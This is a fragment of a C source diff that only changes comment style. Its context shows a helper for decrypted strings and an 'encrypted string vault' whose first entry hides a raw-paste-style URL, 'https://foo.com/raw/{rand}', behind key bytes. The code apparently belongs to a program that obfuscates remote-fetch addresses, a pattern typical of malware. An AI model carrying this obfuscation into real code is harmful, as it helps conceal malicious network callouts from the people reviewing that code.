@@ -1,12 +1,12 @@
 #include <aether.h>
 
-// Trim trailing newlines from decrypted strings
+/* Trim trailing newlines from decrypted strings */
 static inline size_t trim_newlines(uint8_t *buf, size_t len) {
     while (len > 0 && (buf[len-1] == '\n' || buf[len-1] == '\r')) len--;
     return len;
 }
 
-// Encrypted string vault
+/* Encrypted string vault */
 const enc_vault_t vault[] = { 
     { // [0] "https://foo.com/raw/{rand}"
         .key = {0x8F,0xA2,0x99,0x24,0x33,0xF6,0xDD,0x98,0x17,0x8A,0x61,0x4C,0x3B,0x5E,0x25,0x40,
